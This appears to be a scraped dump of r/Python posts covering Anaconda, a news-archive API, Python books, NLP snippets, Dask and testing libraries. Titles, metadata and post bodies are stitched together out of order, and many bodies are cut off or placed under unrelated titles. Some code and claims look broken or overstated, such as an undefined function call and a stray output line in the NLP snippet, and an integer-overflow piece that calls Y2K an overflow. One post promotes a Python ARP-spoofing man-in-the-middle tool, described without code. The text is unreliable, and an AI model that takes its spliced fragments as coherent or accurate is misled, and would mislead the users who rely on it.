...and many more things that the original Android or even iOS app doesn't have. Now it's bundled into one *standalone* project.

* Spin up associated RDBMS systems and distributed file storage systems to hook into Presto for analytics
* Manage environment (Docker) resources
* Take snapshots of running or idle environments

i am an engineer and not a computer scientist. Don't know much about computers and coding in general, but i had to learn Java a while ago. Back then i was realy overwhelmed by installing all that. The instructions in this lecture were shit and it didn't work at all. I ended up only working in the university and almost messed up my entire laptop. And for me back then it was kind of impossible to uninstall all the useless stuff again.

Way later i tought myself python. I was affraid this might happen again.

For me it was pretty complicated to get an overview about all the packages and how to install python and what exactly I even need to install and all that in the beginning and sometimes it still is. 

So for me personally it was a huge breakthrough when i used anaconda for the first time. I had some problems by installing packages that messed everything up, even when i was more experienced already, but with anaconda i could just easily create a new environment and reinstall everything without going to deep into the whole windows and computer thing. 

So as a beginner it was extremely helpful for me and i still like the fact, that i can manage different environments so easily and basically play around with packages without any problems or risks of messing everything up.

But what i was wondering. What is still out there and what are the downsides of anaconda? From my point i don't see any disadvantages so far or do i just have wrong imaginations of how python works without Anaconda? How about Linux and macOS?

I hope you are having a good day. As a programming learner, I have been working on a projects to learn more about databases and creating APIs. I recently made a tool that allows people to get news from the past. Here is a little bit about it:

The News Archives API is a *super* simple application programming interface that allows anyone to get news of the past.

### What problem does thissolve?

In my house, many newspapers of historical events are stuffed into my garage cabinets, like papers from 9/11, presidential elections of 2008, 12, and 16, the first quarantines from covid-19, and much more. These are stored so that in, say, ten years, I can see what was the news on this very important day. Maybe even in hundreds of years, someone will come across my former garage and get a primary source of world-changing events from my time (unlikely).

Theres a lot of problems with this though. Stacks of newspapers take up a *ton* of space in my garage. Its hard to find a single newspaper without looking through *all* of them, and they get lost and destroyed easily.

So I solved this like any bored developer would do move it to tech!

All the problems stated earlier can be solved with some new features too:

* Its automated, so no more doing the work of storing news myself.
* I can store *all* articles, instead of just a few.
* You can look for articles containing a keyword in their title.
* News can be logged for the public, instead of just me.
* Anyone can embed this into their own application.

Try out the API: [https://github.com/gadhagod/News-Archives](https://github.com/gadhagod/News-Archives).

Please let me know any suggestions or give me any feedback. It's still a work in progress, and of course, there is a lot to be done.""|||I need an bot to farm SB points on a website willing to pay.|||Python|||1|||2|||1608167452|||""[removed]""|||Holiday Entertainment: The Best Books, T.V.

However sometimes this is kind of annoying if you have a ton of pages to parse through.

Further, doctors keep track of the patient_visits. A patient_visit has the following attributes, number_of_visits to the clinic, the patient who is visiting, the doctor requested to be visited, and the number of hours needed for consultation. Based on the number of consultation hours, the doctor will get paid.

 
The following functions are required:

1. addVisit: this function adds a patient_visit to the doctor. A new visit will NOT be added if the doctor has already completed 40 hours or more of consultation. If this happens, an error is thrown mentioning that the doctor cannot have more visits this week.

2. calculatePay: this function calculates the payment for the doctor using the following logic: Each hour is worth AED 150 for the first two visits of the patient and all further visits are billed at AED 50.


3. calculateBill: this function calculates the bill for the patient, which displays the doctor's details, patient details, and payment details. An additional 5% of the total is added as VAT.


The student is required to identify classes, related attributes, and behaviors. Students are free to add as many attributes as required. The appropriate access modifiers (private, public, or protected) must be used while implementing class relationships. Proper documentation of code is mandatory. The student must also test the code, by creating at-least three objects. All classes must have a display function, and the program must have the functionality to print the current state of the objects.""|||how do i pull information from this website?|||Python|||1|||2|||1608095633|||""[removed]""|||How can I make a character for twitch streams that goes through different animations?|||Python|||1|||2|||1608091829|||""[removed]""|||How can one make an HTML page that messages with a python script?|||Python|||1|||2|||1608089340|||""[removed]""|||Take Over my Dating Telegram Bot|||Python|||1|||2|||1608088631|||""[removed]""|||Proper way to test multiple API Tokens (PyTest)|||Python|||1|||2|||1608083441|||""[removed]""|||Is Dependency Injector framework worth the effort?|||Python|||1|||2|||1608082571|||""I am building an API at work and figured dependency injection would make my code look better and avoid some of the cyclic dependency issues that you can run into with Flask.

The book is called - shockingly - Python for Mechanical and Aerospace Engineering. I know we all dislike MATLAB here, and I always found it somewhat discouraging in school that MATLAB was the preferred "programming" language for not very good reasons (Simulink notwithstanding). So, I gathered a collection of programs that I had written to show that Python was more capable than MATLAB for most tasks. I was introduced to programming via an introductory CS course in Java in college. I taught myself Python during the summer after that class, and I took a few more CS courses during school. 


I created a website for the book [here](https://pymae.github.io). The website has about 1/3 of Chapter 5: Modeling a 2-body orbit in 2D and 3D so you can get a feel for the style of the books and do a test drive. I also created a GitHub site [here](https://github.com/alexkenan/pymae) where you can see all of the completed programs and some other small goodies. 


Here is the table of contents:

* Intro chapter on how to download Python via Anaconda distribution and getting started with Python syntax

* Using FizzBuzz to show how to write a Python program

* Graphing thrust required and thrust available for an Airbus A321 at three different altitudes with Matplotlib

* Graphing dynamic pressure as a function of time for a rocket launch with Matplotlib

* Getting and plotting airfoil coordinates with Requests and Matplotlib

* Modeling a satellites orbit around Earth with PyAstronomy and Matplotlib

* Creating a GUI to convert units with Tkinter and Pint

* Introduction to web scraping (Requests and BeautifulSoup4) and exporting data to Excel (Openpyxl)

* Modeling camera shutter effect on an aircrafts propeller with Tkinter and Numpy

* Making pdf reports of Python code with Pweave


The book is available on Amazon, Apple Books, Google Play Store, Barnes and Noble, and Leanpub as a DRM-free ebook or PDF thing for $9.99, and a paperback at Amazon and Barnes &amp; Noble for $29.99. The target audience is more in the engineering space (both students and working engineers), but I know I broke some PEP conventions, so feel free to browse through the programs and critique them! 

My focus for these programs was primarily getting them to work, but I also wanted to style the book to start with very linear, functional programming and eventually sort of get to topics like DRY. I did not go into classes, though the GUI chapter probably could have been changed to incorporate classes without too much of a fuss. I also wanted to show a little bit of the troubleshooting and debugging process; I think a lot of early programmers get discouraged by bugs and by resources which do the classic ["Step 1: Draw a circle, Step 2; Draw the rest of the owl"](https://cdn.dopl3r.com//media/memes_files/how-to-draw-a-panda-step-1-step-2-step-3-step-4-J7ekJ.jpg) approach. Showing the debugging process shows insight into how to think, which is always a valuable skill to build.

I am also a big believer in easy access to education, so if you are interested and cannot afford $9.99 (or the minimum $4.99 price set by Leanpub), send me an email listed at the bottom of the About the Author page!""|||Working with Quic pcap files|||Python|||1|||2|||1608049090|||""[removed]""|||Recieved an internship test from Adobe don't know what to expect|||Python|||1|||2|||1608047659|||""[removed]""|||Package for optimisation problems|||Python|||1|||4|||1608046403|||""Hi all,  I was wondering which is the best package for solving optimisation problems in Python according to your experience?

I have made the experience, that Python 3's cleaner handling of Unicode causes various frustrations when writing CLI tools, that typically operate on byte streams rather than characters, and usually just have to interpret a subset of the data as ASCII.

Additionally, it looks like we have to be careful about pipes being closed by the reading process. Sadly, the issue isn't obvious, since it is only triggered, if the pipe's buffer is exhausted -- just like the Unicode issue is often masked by a lot of STDIN data being ASCII.

 my journey with Python started in 2015 and quickly I became familiar with the basics of the language. However, after that, I struggled to apply these foundations in real-life projects since I do not have a background in CS. The [book that is published now](https://www.elektor.com/python-3-for-science-and-engineering-applications) is written for my younger self. If you are an advanced beginner and know about the foundations of Python but want to get a better understanding of central concepts in programming like algorithms, recursion, or backtracking, this might be helpful for you. I tried to find interesting examples from many areas of science. These are real-life problems and puzzles that will make you think. Some are tough to crack but fascinating. Of course, in the book the main ideas on how to solve the tasks are explained in combination with special Python tools and tricks. Btw, it was important to me that all tasks are solvable without any other addons or installations, just fire up Python 3.6+ and you are good to go! A few examples of what is covered:  

 - Computing Pi with arbitrary precision
 - Finding good strategies for games and gambling with simple simulations
 - Generating *really* long palindromes/sentences
 - Encrypting messages
 - Simple applications of multithreading 

Luckily, my publisher Elektor agreed to have a small giveaway.

All these events have one thing in common  they were caused by software errors. Today we show you how the number 2,147,483,647 (two billion one hundred and forty-seven million four hundred and eighty-three thousand six hundred and forty-seven) connects to these historic incidents.

https://preview.redd.it/2em3709p14561.png?width=625&amp;format=png&amp;auto=webp&amp;s=1380c06afed61e2bb4c105bf79c5c57d65ac9943

## How Overflows Come to be

Basically a software solution works with variables. These variables include different types such as characters and numbers. Of course, we all have heard at some point that a computer works with zeros and ones, which are called bits. If a variable gets defined it is usually limited to a certain number of bits.

Let us assume that we define a variable which contains a natural number with 4 bits. Now we can represent numbers from 0 up to 15:

https://preview.redd.it/isr3yoar14561.png?width=224&amp;format=png&amp;auto=webp&amp;s=77a5421a212d2db163d2c2acecae34b4948547ea

So, what happens if we want to perform an addition that can no longer be represented with 4 bits? For example, if we calculate 12 + 7 with 4 bit variables:

https://preview.redd.it/35rbcllt14561.png?width=309&amp;format=png&amp;auto=webp&amp;s=52ef05b1f51f4593cf00ce4b616cf066fa3194cd

The surprising result is 3 and not 19, since 19 can not be represented by a 4 bit variable. To express the correct result we would need an extra bit, i.e. 5 instead of 4 bits.

This problem is called an overflow, which occurs when you try to store a number in a variable that does not fit into its range Hence, the number is larger than the maximum number which can be represented by that variable. Typically, this situation appears while performing arithmetic operations.

Furthermore, it should be mentioned that many software applications are using 32 bit variables that allow them to represent numbers in the range from -2,147,483,648 to +2,147,483,647. Developers often assume that roughly 2 billion positive numbers are quite sufficient and ignore the fact that an overflow can occur over time. In this case, just like in our demonstrative example, an overflow exists. If its data type is an integer, it is called an integer overflow. Overflows are oftentimes the cause for security breaches. The following examples demonstrate which unexpected and devastating consequences different kinds of overflows can provoke.

## Only a few overflows made it into the history books. We have picked the most blatant three for you:

The epitome of a software bug of this kind is probably best demonstrated by the Ariane 5 rocket launch. On 4 June 1996, the unmanned rocket of the European Space Agency (ESA) was set off into orbit. On board were four highly complex satellites which should be brought into the sphere. However, after only 39 seconds the flight ended in a disaster: the rocket disintegrated into a ball of fire and smoke. Investigations have shown that the crash was not a mechanical failure. The main cause was a software bug that could have been easily detected by static analyses and unit tests.

The Ariane 5 was equipped by ESA with the identical software of the previous rocket model, the Ariane 4. The new space launcher reached a much higher velocity than the previous model. The system initiated a self-destruct sequence on exceeding a certain limit. Strictly speaking, the sideways speed was exceeded in this case. The resulting damage amounted to $ 500 million.

Another famous example of how a trivial integer overflow not only threatens the existence of a company but also put peoples life at risk is demonstrated by Boeings 787 Dreamliner. A bug crept into the planes software, which caused the control unit to switch to a fail-safe mode after 248 days of continuous operation. If this error occurs during a flight, the pilot loses control of the aircraft and a crash is the inevitable consequence. However, if you look at the figure more closely, 248 days in hundredths of a second are exactly 2,147,483,647. To solve this significant problem, Boeing had 2 solutions: Either restarting the control unit before the 248 days expired or, the much safer option, adequate software testing.

Probably the most famous overflow bug in history is the publicly hyped Millennium Bug, Y2K. The problem of the 2000s caused headaches for lots of developers: not all applications were designed to store years after 1999. Myriads of companies had to update their software solutions to avoid possible outages. However, at the turn of the new millennium serious consequences did not occur thanks to countless hours of hardworking programmers.

Although, twelve years later an amusing incident did happen: a 105 year old Swedish lady received an invitation to start preschool. Invitations were sent throughout the Swedish kingdom to children who had the final digits 07 in their year of birth. Developers did not consider that there were individuals born in 1907.

## Automatic overflow detection

Overflows are one of the most common weaknesses of software applications. During the development of software, usually special attention is paid to avoid such problems. However, such care is neither efficient nor successful, as our selected examples demonstrate. This is true even for software projects in industries with high quality requirements.

Even simple programs often consist of several 100,000 lines of code. It is almost impossible to find every single problem in any program, let alone test such programs. The higher the complexity of an application, the more susceptible it is to software bugs. For exactly these reasons we have developed Symflower. Symflower generates unit tests fully automatically and finds potential overflows in every source code. Regardless of the number of lines of code and the complexity of the application. Even without any human influence.""|||How to use dict comprehension in this case?|||Python|||1|||5|||1607934466|||""I usually populate my dict using a for loop like this:

    mem = dict() for char in string:     if char not in mem:         mem[char] = 1     else:         mem[char] += 1 

Now I wonder if there a way to populate a dict while maintaining the count of duplicates?

For example:

    mem = dict() for char in 'abb':     if char not in mem:         mem[char] = 1     else:         mem[char] += 1  print(mem) # {'a':1, 'b':2} 

could you somehow do it with dict comprehension?

I'm stuck at

    {key:i?? for key in 'abb'} 

or is this not possible?

I mean I feel like it's not 'pythonic' enough having to populate a dict with clunky 5 lines of code..

The results.  Conjunctions aren't that rare, in general.  There were 56 visible among 7 other planets plus the Moon and Pluto in 2020 alone.  Dec 21 2020 is the 18th closest conjunction of the 430 found across 6000 years.

It loops through all combinations of those 9  measuring apparent separation daily.  Local minima are found via SciPy's argrelextrema.  The script then recurses on each of the minima refining the timestamp of the closest approach down to the minute level by considering the 24 hours before and after the point found at day resolution.

Results are stored in Pandas DataFrames for ease of filtering, sorting and assembly from results delivered by threaded recursion.  Julian dates are used throughout because the only thing that hates prehistoric dates more datetime, is numpy.  Julian dates (float representing days, with hours, minutes, etc represented as decimal versions of a day)

Performance was an interesting challenge here.  The JPL Spice kernel file I'm using covers 3000 BCE to 3000 AD.  That's nearly 2.9 million days.  Some pairs only produce a few hundred days that need to be refined to  minute resolution others (usually involving the Moon) have 60-70k days to consider.

Those recursive calls are made to a pool of threads handled by concurrent.futures, specifically ProcessPoolExecutor.  The max number of threads in the pool is controllable.  On my MacBook plus, it finished in about 4 hours with a pool size set to 50.  I spun up a 32 CPU Ubuntu cloud box, set the pool to 500 and it was done in under an hour (total cost $0.45).

Code is here, including a 56Mb Excel file with tabs for each combination of planets, moon, Pluto.  I learned a lot about thread pools.  Without them, this script would take at least 25 times longer to run.

I like to think of it the path with least resistance.

Between each node a weight is defined, this could be distance but it doesn't have to be. Think navigation apps like google maps -they use more than just distance... possibly traffic, road speed and so on, and these all add up to give a final weight to the edge between nodes.

See this example below of how you can use different weights to restrict the flow on the darker of search (the darker areas).

I made a rest framework based on aiohttp, marshmallow and sqlalchemy libraries for people who are familiar with Django Rest Framework (drf), and want to try async python in a web application.

It uses same concepts as in drf, so it is easier for developers not familiar with asyncio to start exploring aiohttp without need to learn everything at once (switching from Django's ORM to sqlqlchemy, switching from drf serializers to other libraries (or to domain model pattern), etc).

It's not mature enough to be production ready, but I think it's a good starter pack for async python newcomers and theirs pet projects.

I'd love to continue developing this project, so any feedback, incoming open issues on GitHub and PRs are welcome.""|||Gene ontology enrichment automation script|||Python|||1|||0|||1607635020|||""Please see all the script description posted here:

I compiled a few code snippets to clean and tokenize text data using Python. It's especially useful when you're pre-processing data for NLP tasks.

Take a look at them below. Code highlighting doesn't work in reddit, so if you want a better reading experience check the version in [my blog](https://dylancastillo.co/nlp-snippets-clean-and-tokenize-text-with-python/).

## How to use the snippets

I'd recommend you to combine the snippets you need into a function. Then, you can use that function for pre-processing or tokenizing text. If you're using **pandas** you can apply that function to a specific column using the `.map` method of pandas' `Series`.

Here's an example:

    import re
    import pandas as pd
    
    from string import punctuation
    
    df = pd.DataFrame({
        "text_col": [
            "This TEXT needs \t\t\tsome cleaning!!!...", 
            "This text too!!...       ", 
            "Yes, you got it right!\n This one too\n"
        ]
    })
    
    def preprocess_text(text):
        text = text.lower()  # Lowercase text
        text = re.sub(f"[{re.escape(punctuation)}]", "", text)  # Remove punctuation
        text = " ".join(text.split())  # Remove extra spaces, tabs, and new lines
        return text
    
    df["text_col"].map(preprocess_string)

Also, before testing the snippets, make sure to copy the following function at the top of your Python script or Jupyter notebook.

    def print_text(sample, clean):
        print(f"Before: {sample}")
        print(f"After: {clean}")

# Lowercase text

    sample_text = "THIS TEXT WILL BE LOWERCASED. THIS WON'T: "
    clean_text = sample_text.lower()
    print_text(sample_text, clean_text)
    
    # ----- Expected output -----
    # Before: THIS TEXT WILL BE LOWERCASED. THIS WON'T: 
    # After: this text will be lowercased. this won't: 

## Remove cases (useful for caseles matching)

    sample_text = "THIS TEXT WILL BE LOWERCASED. THIS too: "
    clean_text = sample_text.casefold()
    print_text(sample_text, clean_text)
    
    # ----- Expected output -----
    # Before: THIS TEXT WILL BE LOWERCASED. THIS too: 
    # After: this text will be lowercased. this too: ssssss

    print_text(sample_text, clean_text)

I'm Alex and I am pleased to showcase this project. Python is an awesome language, you can build a decent desktop app with just the standard library. How is it possible ? Well, because Python comes with [batteries included](https://www.python.org/dev/peps/pep-0206/#id3). So I started with a framework that relies exclusively on the standard library to create desktop applications. I ran into difficulties but kept moving forward. For example the default GUI Toolkit of Python, Tkinter does not have a built-in [Table](https://stackoverflow.com/questions/9348264/does-tkinter-have-a-table-widget). That does not prevent people from creating tables, but it isn't always an obvious path for beginners who are quickly redirected to Qt by example. I created a Table widget (megawidget to be precise) to solve this issue. Then the problem of the [look](https://www.reddit.com/r/learnpython/comments/djn7f6/why_python_gui_are_so_f_ugly/) arose. I created a theme/style system to help make the GUI looks pretty. Then I ran into the problem of multithreading with Tkinter. I wrote a software library to make things easy. I continued to solve problems like this. At the beginning it only concerned the GUI, then multithreading, then the connection with the database, the interaction with JSON files, fetching resources, etc. I decided to create a graphical SQL editor using the framework to see how well it does the job. Then, I built a graphical test runner that extensively uses pyrustic.threadium (the library to facilitate multithreading). Then I wondered how to call a framework that comes with a test runner and an SQL editor. `Framework with batteries included` ? Why not software suite ? Too pretentious ? Okay, let's add "lightweight" and also let's add other applications to the suite to earn the title of software suite (lightweight of course). I added the Manager which helps you to manage the project you want to develop with the software suite. Then I added `Hub`. An application to publish your release package on Github. Finally, Pyrustic supports you from the start of your project, through editing/viewing the content of the database, tests running, packaging, then publishing your packaged project on Github. I also created Geet which makes the download-unpack-install-run process easier. The ReadMe on Github says more and there is also a demo video that shows the creation of a project until it is published on Github. Pyrustic and Geet are available on PyPI, so you can install them with `pip`. But beware, all versions below 1.0.0 will be considered Beta. So I'm currently targeting an audience of early adopters. I look forward to reading your feedback. And yes, I'm not an English native speaker, instead ... I SPEAK PYTHON 3.X !!!

The script will take text as an argument or from a pipe (for example from `fortune`), plus optional arguments, and will output it in a sign with an ASCII cat holding on it.  

You can set the position of the cat along the sign by specifying a percentage (0-1) via the argument `-cp` . The cat will stop at the end or beginning of the sign if the value is too high or too low.  

You can also set the horizontal position of the entire output relative to the terminal, as a percentage like before, with the argument `-gp`. The script will calculate if the drawing would be cut by the boundaries of the terminal and will adjust its position accordingly.

sillynium lets you draw boxes directly to a webpage, around webpage elements you want, and automatically gets the elements properties for you. Different colour boxes tell the program you want to do different things. Red means "Input text here"; Green means "Click this button". 

Once a drawing is finished the program generates a python selenium script, that when run, does what you told it to do. No coding required. This is an open-source alternative to browser recorders, there's no stop/start and no slowly typing text, and you can also grab any element on the page, not just elements you interact with (like in recorders). 

\- V1 was just a concept idea that draws on a \*\*\*webpage screenshot\*\*\*,

\- V2 is in development. It draws \*\*\*directly to the webpage\*\*\*

    m0 p0 end 9.933 

a row m1:p1:start:2.984 means, machine m1 starts process p1 at timestamp 2.984.

Goal:

Design a table schema for this data to be used by data scientist to query metrics such as process with max average elapsed time and they can plot each process. Design a ETL in python to load data to above data model /table. Follow-up

How to optimize process to parse the file and load to table. Can it be done with constant memory. There can be multiple machine m0..mN, each machine can have millions of process entries. How you will scale.

**My approach:** Python to convert the input format to dictionary {(m:p):\[start, end\]} that can be loaded to sql tables

python code :

    def calculateAvg(records):      
        d= {}      
        for record in records:         
            m, p, status, time = record.split()         
            if (m,p) in d.keys() and status == 'start':            
                d[(m,p)][0] += float(time)         
            elif (m,p) in d.keys() and status == 'end':            
                d[(m, p)][1] += float(time)         
            elif (m, p) not in d.keys() and status == 'start':            
                d.update({(m, p):[float(time),0]})        
            else: d.update({(m, p):[0,float(time)]}) 
        return d 
        

**sql query :**

    select avg(start-end) as max 
    from log 
    group by machineId, processid      
    order by avg(start-end) desc 
    limit 1 

Questions

1. How can I change the code to have constant memory
2. Can my approach be improved (how else can we calculate the max avg)
3. How can this approach be scaled?
4. What clarifying questions can be asked Please advice and let me know if I have missed any details.

WORKING:  The program goes through every file and looks at the extension, then it  matches the file extension to see if it matches with any type, then  using Shutil library, it moves the file to the directory type.  


EXAMPLE  : PDFs, DOCX, or PPTX files are considered as Documents whereas MKV,  WEBM, MP4 files are considered as Videos. So if the program goes through  the file with extension .docx then, it moves the file into Documents  folder and if the file is having .mkv file extension, then it moves the  file into Videos folder.  


It only works in Linux right now, but later on Windows support will be added.   
If you have Xtreme Video Downloader installed then it will also go through Downloader type folder (eg : Documents, Video)

Turns out the package is a 6000-line single-file beast. This got me thinking, if there would be a way to neatly visualise a script's structure and inner dependencies. My initial thought was that maybe I could find some groups of definitions in Black or other files, that could be easy to refactor into sub-modules, bringing the complexity down. The graphs could also reveal some bad design if they are too interconnected.

Enter [Pyfactor](https://github.com/felix-hilden/pyfactor) (work in progress), a fresh library of mine for exactly that purpose. Parsing Python [syntax trees](https://docs.python.org/3/library/ast.html) proved easier than I thought, and I'm here to share the first fruit. Starting from simple examples, two ridiculously overcomplicated hello world applications can be found in the GitHub [readme](https://github.com/felix-hilden/pyfactor#examples) with code. Then moving on to some actual projects. The first other single-file project I could find was [sphinx-autodoc-typehints](https://github.com/agronholm/sphinx-autodoc-typehints), which generated a graph like this:

*Processing img 7h61c7ax9u361...*

We can clearly see a central function and a hierarchy of other structures. The graph can be made clearer by removing imports from the picture.

*Processing img zkk082j3au361...*

We can observe tightly separated trees under "format annotation" and "get all type hints", and a central logger instance, referred to by many other functions. For a first-time reader this is very insightful, at least it was for me. Compared to reading 400+ loc thouroughly, from this picture alone one can get a rough understanding of what's happening. Of course it's also thanks to great naming in the library.

Now onto Black, which was a different beast. Visualising with imports was a no-go. There's too much even without them. See for yourself.

*Processing img ipg2ms9yau361...*

I'm not here to diss Black or its contributors. I think 6000 lines does it regardless. There is some obvious structure, like caching functionality on the far right, and hub variables like "LN", "syms" and "token", and a hub class "Mode". But it's rather difficult to see exactly what's going on.

More importantly, I've already found some use for this when going through some scripts and seeing what could be extracted into submodules. It's no miracle worker, but I think it could have potential as a tool for making the right decisions. What do you think?""|||Faster Way To Check A Proxy With Requests?!?|||Python|||1|||1|||1607379771|||""Hey guys,

Whether for small data science teams or large groups of data engineers, many companies require parallel computing infrastructure to cope with an ever increasing amount of data. Dask has emerged as a convenient &amp; flexible framework for data analysis at scale. Dask dataframes enable using familiar APIs and idioms from NumPy &amp; Pandas; this design facilitates prototyping data workflows on a laptop that can be readily adapted to production systems.

During this 30-minute webinar, we will provide a taster of our training starting with a quick review of using Dask dataframes for out-of-core computing. That will lead us into a demonstration of optimizing Dask performance by converting CSV data to Parquet columnar storage and by applying efficient representations of categorical data types.

This isnt a post specifically about Python, so its likely that itll be removed. However, Python was a favorite language of mine in school so I guess its somewhat appropriate that I seek advice here. If it gets removed, it gets removed - I cant be mad. 

Anyways, I graduated a year ago from a big university with a bachelors degree in CS, like many of you all. The idea of having to go through coding interviews terrified me as I have general anxiety as it is and I didnt breeze through CS like some of my classmates at the time. Projects took me a while but when I graduated I felt like I was fairly confident in quite a few aspects pertaining to CS and with an internship under my belt I set out to look for a job. 

I was fortunate enough to have my girlfriend recommend I go to the job fair at my school and so I did. Huge companies sent out reps left and right to scout out potential new hires and unlike many of my classmates, I walked around fairly aimlessly until getting stopped by a recruiter who works for the department of defense. Long story short, after setting up interviews for a few different government agencies, I had four interviews and walked away with four job offers. I took the one closest to home and now work in the public industry for almost a year making decent money. 

I find it hard to complain because I make enough to support my girlfriend and myself while she finishes up school next summer. The hours arent terrible, the work load is very minimal, I get paid for overtime, Ive got great benefits but I literally do no programming. None. It was nice at first because I liked the breather I was given from the constant coding projects but now Im viewing my absence behind the keyboard to be a bad thing. I want to start coding again in my free time so that I can maybe take my security clearance and some of my personal projects and score another job elsewhere once my girlfriend finished up her degree. 

Any advice on where the hell to start? I cant be the only one this has happened to before. I feel so lost but I know I can change that with a little guidance. Im likely going to bed soon because Ive got work early in the morning and Im sorry about the wall of text and my complaints, Im just worried a bit and would love some reassurance.

I want to feed each frame of data to each of the processors before doing the next frame.

Now an obvious way to do this would be to have each class have something like a `processFrame()` method, but for some of the processors it would be much easier to write them as a function that would be called once and iterate over all of the frames. What I came up with was to make the processors a generator, but instead of yielding values to the caller the processors receives from the caller. So a processor ends up looking something like this:

    def processor():
        while frame := (yield):
            # Do something.

    # Elsewhere...
    # Start each processor.
    for processor in processors:
        next(processor)
    # Send frames to all processors as they are received.
    for frame in frames:
        for processor in processors:
            processor.send(frame)
    # Signal that there are no more frames to process.
    for processor in processors:
        processor.send(None)
    

Of course this is greatly simplified from what I have actually written, but it conveys the idea. Using this pattern, processors can be composed:

    def readThreeFrames():
        frame1 = (yield)
        frame2 = (yield)
        frame3 = (yield)
        # Do something with these.

    def processor():
        while frame := (yield):
            if someCondition(frame):
                yield from readThreeFrames()

You can see that this sort of functionality would be difficult to write using a `processFrames()` method.

Now I'm sure I'm not the first person to come up with this pattern, however I can't find anything and can't think of what to call it. The best description I can think of is that it's sort of an "inverse generator": Instead of the callee generating values for the caller, the caller generates values for the callee.

While writing this post I actually noticed that this pattern is used as an example for `yield from` [here](https://docs.python.org/3/whatsnew/3.3.html#pep-380). So obviously it's been used before.""|||SMS Verification for Unique Accounts/2FA|||Python|||1|||0|||1607309273|||""Hi All,

After a positive response to my idea, I decided to take the rest of the day to extend my script, adding sentiment analysis and the ability to post to a Twitter account I made. 

In short, this account now tweets every 3 hours - it monitors 4 reputable accounts, looking for tickers that they have just tweeted for the first time. In the Tweet, it then orders these tickers from the highest sentiment to the lowest. This way, it aides in getting an early start on long plays, called by accounts that have a high rate of being correct. Make no mistake though - these calls are not for day trades, they are for longer plays which will often require more patience.

The accounts which it monitors are in the bio.

Unhappy with the current state of WORDS ports to Python, I wrote my own, and its features and relative speed are amazing even to me. I was able to process a 400 page volume from Leonhard Euler in 31 seconds, finding every word, determining its stem and inflection, generating a properly formatted dictionary entry, and saving it to a file. It can also search text for example sentences, and includes a very powerful filtering implementation which can resolve ambiguities, speed up processing time, or cater to a student's needs and experience level.

It only uses Python 3.x built-in libraries.|||Python|||1|||38|||1607263225|||""Initiating a Man-in-the-middle (MitM) attack usually requires setting up information on the target host and gateway, as well as executing the attack against each one individually. On top of that, doing this in Python is often portrayed as requiring third-party libraries in many books and tutorials out there.

This tool makes exclusive use of built-in Python 3.x libraries and automatically reads all the information required to initiate the attack, requesting from the user nothing but the target's IP address (as long as it belongs to the same network segment as the attacker, as is the case of any ARP spoofing attack).

Use this tool to assess the security controls implemented on your own networks, test Intrusion Detection Systems you may have set up or simply expand your knowledge on cybersecurity and Python programming in general.

This is a continuation of the building of a pure-Python tool set I announced previously with my [Network Packet Sniffer](https://github.com/EONRaider/Packet-Sniffer). This time we make use of design patterns such as command and proxy, query networking information from kernel routing tables and perform the usual operations with ctypes.

The code is available on GitHub and open to pull requests. Make good use.

Humlix makes it easy to test, e.g., Python Flask applications and their endpoints.
Traditionally we write unit-tests, and it is easy to miss edge cases. e.g., looking at the simple example below, it is sometimes easy to not handle null or Noneness correctly.

```python
class Car:
    def __init__(self):
        self.cars = ["Ford", "Volvo", "BMW"] #Fake db
    
    def getCarIndex(self, user):
        if (user['hasCar'] == True):
            return self.cars.index(user['car'])
        else:
            return 0  

from flask import Flask, request, jsonify
app = Flask(__name__)

@app.route('/cars', methods=['POST'])
def cars():
    json = request.json
    car = Car()
    carIndex = car.getCarIndex(json) 
    return jsonify(carIndex = carIndex)
```

Humlix uses Property-based testing to test endpoints and handles an HTTP status code of 500 as a bug since the backend couldnt handle the request correctly.

I'm a JavaScript dev that recently started to write Python for work. My dev flow is really TDD heavy, and while `unittest.mock` is very cool, I found it didn't line up exactly with how I like to stub out dependencies. So I wrote Decoy to bring the kind of stubbing API that I like to Python!

I was very influenced by the APIs of [testdouble.js](https://github.com/testdouble/testdouble.js) is JS-land and [mockito](https://site.mockito.org/) in Java-land, which are "rehearsal" based. A rehearsal API is really powerful, especially if you're working in a fully typed codebase.

        # arrange mock to *unconditionally* return mock data
        # unconditional return increases the likelihood of a false pass

        assert result == mock_book
    
        # assert that the database stub was called correctly
        # your brain has to jump back to remembering how you arranged the mock
        # if you forget this step, the unconditional return becomes a problem

It is a construct that allows your programming language to run recursion even if your language didn't support recursion!

It is a two line description in the language of lambda calculus, but might not be that simple to implement without copying code. Imagine if your version of Python said I am not gonna support recursion- could you still do recursion? That's what it's about. [In this post](https://www.lambdacircle.com/discovering-the-y-combinator-by-mistake-1-2/), I used Python to 'try to discover' it step by step, and I must say that it was a beautiful night, and that Python is really a language that you can easily use to 'think in'. Thought I'd share it here (my first post ever!). Hopefully, this will also motivate you to dig deeper into beautiful ideas like the lambda calculus, type theory, etc. etc. :)

The first (and maybe fastest) choice with virtual input using Python is `python-uinput`, and it offers a simple example on how to easily move the mouse cursor (https://github.com/tuomasjjrasanen/python-uinput).

However, that movement is only **relative**, implied by the `REL_X`/`REL_Y` names. For the uninitiated, relative means moving the mouse to a position relative to its current location.

In my search to find a way to do **absolute** mouse movement with this module, I came across these three pages that offered important information on it: 
 
- https://answers.launchpad.net/python-uinput/+question/185890
- *especially* https://stackoverflow.com/questions/49500388/cant-write-touch-events-to-uinput-using-python-uinput
- https://stackoverflow.com/questions/59468535/setting-absolute-cursor-position-using-python-uvdev

# How to simulate absolute mouse movement with `python-uinput`:

First, we have to talk about how "screen space" is calculated on Linux. The whole "screen space" is a rectangle that is just big enough to contain all connected monitors. That means that a setup with one monitor with the size of `1280x720` will have a total "screen space" of `1280x720`. A setup with two monitors, `1366x768` and `1440x900` side-by-side will be `2806x900`. This, of course, changes if you have one monitor on top of another or one monitor is higher than the one next to it etc.

Oh, and keep in mind that `y` is counted top-to-bottom (0 at the top and 900 at the bottom). 

Now, the important thing to know about `python-uinput` that it registers input events on the `uinput` device, which includes mouse movement. Quoting from the Launchpad page, "Xorg does not assign mouse handlers for absolute axis devices by default." That means that we have to do it ourselves, and thankfully, `python-uinput` provides a helpful feature:

&gt; Line 183 in \_\_init.py\_\_: `                absmin, absmax, absfuzz, absflat = ev_spec[2:]`

All we have to do is add a tuple to an argument that involves mouse movement events, such as `ABS_X` and `ABS_Y`:

```
device = uinput.device([uinput.ABS_X + (0, 255, 0, 0), uinput.ABS_Y + (0, 255, 0, 0)])
```

The first two numbers in the tuple are the most important for most applications, since they dictate the range for each axis. 

How does this tie into the "screen space" thing? **The size of the "screen space" is what we can use as a range for `ABS_X` and `ABS_Y`.**

